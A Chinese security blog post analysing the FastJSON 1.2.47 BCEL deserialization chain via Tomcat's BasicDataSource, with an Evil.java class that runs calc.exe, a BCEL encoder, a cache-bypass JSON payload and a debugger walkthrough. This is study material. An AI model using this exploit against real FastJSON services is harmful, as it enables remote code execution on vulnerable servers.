---
title: 代码审计 | FastJSON 1.2.47 不出网利用 —— BCEL 链分析 | setter 与 getter 触发对比
categories:
  - [代码审计, fastjson]
tags:
  - FastJSON
  - Java反序列化
  - BCEL
  - RCE
cover: >-
  https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image4.png
abbrlink: e90faa78
date: 2026-03-28 15:00:00
---

> 环境：FastJSON 1.2.47 / JDK 8u65 / Tomcat 9.0.20 / IDEA 调试

---

## 目录

- [前言](#前言)
- [和 TemplatesImpl 链的区别](#和-templatesimpl-链的区别)
- [补充：FastJSON 的 getter/setter 扫描机制](#补充fastjson-的-gettersetter-扫描机制)
- [环境准备](#环境准备)
- [恶意类编写](#恶意类编写)
- [字节码转换脚本](#字节码转换脚本)
- [Payload 结构](#payload-结构)
- [调试跟踪](#调试跟踪)
- [完整调用链总结](#完整调用链总结)

---

## 前言

上一篇 TemplatesImpl 链需要开启 `SupportNonPublicField`，因为 `_bytecodes` 这些字段是 private 的，FastJSON 默认碰不到，利用条件比较苛刻。

BCEL 链是针对这个问题的替代方案，用的全是 public 的 setter，不需要 `SupportNonPublicField`，利用条件宽松一些。

---

## 和 TemplatesImpl 链的区别

|  | **TemplatesImpl** | **BCEL** |
|---|---|---|
| 是否需要 `SupportNonPublicField` | ✅ 必须 | ❌ 不需要 |
| 环境依赖 | 无 | 需要 Tomcat（`tomcat-dbcp`） |
| 利用难度 | 条件苛刻 | 相对宽松 |

不需要 `SupportNonPublicField` 的原因很简单：BCEL 链用的全是 public 的 setter，`setDriverClassName()` 和 `setDriverClassLoader()` 都是公开方法，FastJSON 默认就能调到，不需要额外开 Feature。

代价就是**依赖 Tomcat 环境**，目标没有 `tomcat-dbcp` 依赖就打不了。

---

## 补充：FastJSON 的 getter/setter 扫描机制

在正式跟链之前，先把这个机制搞清楚，不然看 payload 会有很多疑问。

### 自动 getter 触发

FastJSON 反序列化完成之后，会主动扫描类里所有的方法，满足以下条件的 getter 会被**自动调用**，不需要在 JSON 里显式写对应字段：

- `get` 开头 ✅
- 无参数 ✅
- 返回值不是基本类型 ✅
- 没有对应的 `setter` ✅

`getConnection()` 完美符合这四条，所以 payload 里根本不需要写 `"connection"` 字段，FastJSON 自己就会去调它。

举个对比例子，TemplatesImpl 链里的 payload 是这样的：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image1.png)

会触发 `getOutputProperties()`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image2.png)

其实 `_outputProperties` 这个字段写不写都行，即使删掉了也依然能执行成功——因为 `getOutputProperties()` 同样满足自动扫描的条件，FastJSON 会自己触发它。

### setter 触发

setter 的触发逻辑更直接，FastJSON 解析 JSON 字段的时候，对每一个 JSON 字段都会去找对应的 setter，找到了就调：

```
JSON 里有 "driverClassName"  →  找 setDriverClassName()  →  调用
```

不需要任何特殊条件，但**必须在 JSON 里显式写这个字段**，FastJSON 不会主动扫描 setter。

| **扫描机制** | **setter** | **getter** |
|---|---|---|
| 触发条件 | JSON 里写了对应字段 | FastJSON 主动扫描，无需写字段 |
| 限制 | 几乎没有 | 无参、无对应setter、返回非基本类型 |
| 典型例子 | `setDriverClassName()` | `getConnection()` |

---

## 环境准备

`pom.xml` 加上 Tomcat 依赖：

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.20</version>
</dependency>
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image3.png)

---

## 恶意类编写

`Evil.java`

这次**不需要继承 AbstractTranslet**，简单很多：

```java
import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

保存为 `Evil.java`，然后编译：

```bash
javac Evil.java
```

---

## 字节码转换脚本

得到 `Evil.class` 之后，需要把它转成 `$$BCEL$$` 格式的字符串。

BCEL ClassLoader 有个特殊能力：能识别 `$$BCEL$$` 开头的字符串，把后面的内容解码成字节码直接加载，整个过程在本地完成，不需要任何网络连接。

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;

public class BCELEncoder {
    public static void main(String[] args) throws Exception {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String encoded = Utility.encode(javaClass.getBytes(), true);
        System.out.println("$$BCEL$$" + encoded);
    }
}
```

跑完把输出的 `$$BCEL$$...` 字符串复制出来，填进 payload 的 `driverClassName` 字段。

---

## Payload 结构

因为用的是 1.2.47 版本的 FastJSON，payload 比较长，但关键是 `c` 里的内容，`a`、`b` 都是为了写入缓存绕过检测机制（缓存绕过原理在上上篇已经详细分析过了）：

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "b": {
        "@type": "java.lang.Class",
        "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "c": {
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {
            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A..."
    }
}
```

注意 `driverClassLoader` 里要套一层 `@type`，因为 `setDriverClassLoader()` 的方法签名是：

```java
setDriverClassLoader(final ClassLoader driverClassLoader)
```

参数类型是 `ClassLoader` 对象，不是 `String` 这种基本类型，FastJSON 必须先实例化一个对象才能传进去。如果只写 `"driverClassLoader": {}` 不带 `@type`，FastJSON 不知道要实例化什么类，传进去的就是 null，后面 `Class.forName()` 用 null ClassLoader 根本不认识 `$$BCEL$$` 格式，链就断了。

对比一下规律：

```
参数是基本类型/String  →  直接传值，不需要 @type
参数是对象类型         →  需要 @type 告诉 FastJSON 实例化什么类
```

效果：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image4.png)

---

## 调试跟踪

缓存绕过的步骤直接跳过，来到实例化调用 get 和 set 的部分。

初次不知道的情况下，直接把 `driverClassName` 和 `driverClassLoader` 的 set 和 get 全部打上断点，再分析代码。

### setDriverClassLoader

先来到 `setDriverClassLoader` 方法：

```java
setDriverClassLoader(final ClassLoader driverClassLoader)
```

这里传入的是一个类对象，因此前面的 payload 里 `driverClassLoader` 必须用 `@type` 实例化一个类，不然不能正常运行。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image5.png)

可以看到传进来的参数 `driverClassLoader: ClassLoader@852`，是一个真实的 BCEL ClassLoader 实例，不是 null，赋值前 `this.driverClassLoader` 是 null，这行执行完就注入进去了。

### setDriverClassName

接着来到 `setDriverClassName`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image6.png)

把 `$$BCEL$$...` 字符串注入进去。

### method.invoke 反射调用

接着看到了 `method.invoke(object, value)` 反射调用：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image7.png)

这就是 FastJSON setter 触发的底层实现，不是直接调 `setDriverClassName()`，而是通过反射调用，所以看到的是 `method.invoke` 而不是直接的方法调用。

### getConnection

setter 阶段完成后，FastJSON 自动扫描到 `getConnection()` 符合条件，主动触发：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image8.png)

`IS_SECURITY_ENABLED = false`，直接走最后一行：

```java
return createDataSource().getConnection();
```

### createDataSource → createConnectionFactory

进入 `createDataSource()`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image9.png)

接着进入 `createConnectionFactory()`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image10.png)

因为 `driverClassName` 不为空可以继续执行：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image11.png)

就是之前写的 `$$BCEL$$$l$8b$I$A$A$A$A$A...`

### Class.forName 触发 RCE

来到关键一行：

```java
driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
```

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1.2.47%20BCEL%20%E9%93%BE_image12.png)

三个参数各司其职：

```java
Class.forName(driverClassName,   true,   driverClassLoader)
//            ↑                  ↑       ↑
//     $$BCEL$$...字符串        立即初始化  BCEL ClassLoader
```

- `driverClassLoader` → 指定用 BCEL ClassLoader 来加载，不用默认的
- `driverClassName` → BCEL ClassLoader 识别到 `$$BCEL$$` 开头，解码成字节码
- `true` → 立即初始化这个类，也就是立即执行 static 块

第二个参数 `true` 是关键，类加载进来之后马上初始化，static 块里的 `calc.exe` 直接执行。如果是 `false`，类加载进来但不初始化，static 块不执行，就不会弹计算器了（当然实际代码里这个值是固定的）。

执行完后计算器弹出来了。

---

## 完整调用链总结

```
JSON.parseObject()
  → setDriverClassLoader()      [BCEL ClassLoader 对象注入]
  → setDriverClassName()        [$$BCEL$$...字符串注入]
  → getConnection()             [FastJSON 自动扫描触发，无需写字段]
    → createDataSource()
      → createConnectionFactory()
        → Class.forName(driverClassName, true, driverClassLoader)
          → BCEL ClassLoader 识别 $$BCEL$$ 前缀
            → Utility.decode() 解码成字节码
              → defineClass() 加载进 JVM
                → 类初始化 → static 块执行 → 💥 RCE
```
